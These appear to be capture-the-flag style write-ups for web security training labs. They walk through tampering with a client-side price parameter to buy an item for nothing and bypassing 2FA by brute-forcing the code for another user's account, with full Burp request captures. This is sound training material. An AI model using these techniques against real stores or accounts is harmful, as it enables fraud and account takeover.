# Lab: Excessive trust in client-side controls

First, open Burp Suite and access the lab. Log in using the provided credentials wiener:peter.

After logging in, navigate to the home page. You will see a product priced at $1337, while your account balance is only $100, so you cannot purchase it normally.

Turn on Burp Intercept and click “Add to cart” on the product page. The request will be captured in Burp. You should see the following request:

```
POST /cart HTTP/2
Host: 0a0b00ff04458ad281b0993600f000b5.web-security-academy.net
Cookie: session=YR8shXWi04rq8I4BkmrmWWPZVsIDltBx
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 49
Origin: https://0a0b00ff04458ad281b0993600f000b5.web-security-academy.net
Referer: https://0a0b00ff04458ad281b0993600f000b5.web-security-academy.net/product?productId=1
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers

productId=1&redir=PRODUCT&quantity=1&price=133700
```

Notice that the price parameter is being sent from the client side. This is the key flaw.

Modify the request by changing:
price=133700 → price=0

Forward the modified request.

Now go back to the cart page. You will see that the product price has been updated to 0, confirming that the server trusted client-side input without proper validation.

Proceed to checkout and complete the purchase to solve the lab.


# Lab: 2FA broken logic

First, I logged into my own account while running Burp Suite and observed the 2FA verification flow. During this process, I noticed that the verify parameter in the /login2 request determines which user’s account is being verified.

Next, I logged out and captured the GET /login2 request. I sent this request to Burp Repeater and modified the verify parameter to carlos. This allowed me to initiate the 2FA process for Carlos’s account.

After that, I logged in again using my own credentials and intentionally entered an incorrect 2FA code. I captured the resulting POST /login2 request and sent it to Burp Intruder for brute-forcing.

The captured request was:

```id="x92kd1"
POST /login2 HTTP/2
Host: 0a15008804d1938a81b1cf7f004400be.web-security-academy.net
Cookie: session=91ka4mE6bKYyNTzdH5XfSxjxC6Sjs3RU; verify=carlos
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 13
Origin: https://0a15008804d1938a81b1cf7f004400be.web-security-academy.net
Referer: https://0a15008804d1938a81b1cf7f004400be.web-security-academy.net/login2
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers

mfa-code=1234
```

In Burp Intruder, I kept verify=carlos in the Cookie and brute-forced the mfa-code parameter. During the attack, I monitored the responses and identified a request that returned a 302 status code, indicating a successful login.

I opened that response in the browser and navigated to “My account,” which confirmed access to Carlos’s account and solved the lab.


# Lab: High-level logic vulnerability
